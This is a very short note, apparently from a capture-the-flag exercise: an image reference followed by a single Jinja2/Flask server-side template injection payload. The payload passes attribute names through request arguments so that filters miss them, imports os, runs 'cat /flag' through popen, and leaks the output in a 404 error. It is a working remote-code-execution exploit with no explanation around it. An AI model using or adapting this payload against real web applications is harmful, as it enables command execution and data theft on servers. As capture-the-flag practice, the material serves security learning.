![[Pasted image 20241215121415.png]]

```python
{{g.pop|attr(request.args.globals)|attr(request.args.getitem)(request.args.builtins)|attr(request.args.getitem)(request.args.imp)('flask')|attr('abort')(404,g.pop|attr(request.args.globals)|attr(request.args.getitem)(request.args.builtins)|attr(request.args.getitem)(request.args.imp)(request.args.o)|attr(request.args.p)('cat /flag')|attr('read')())}}
```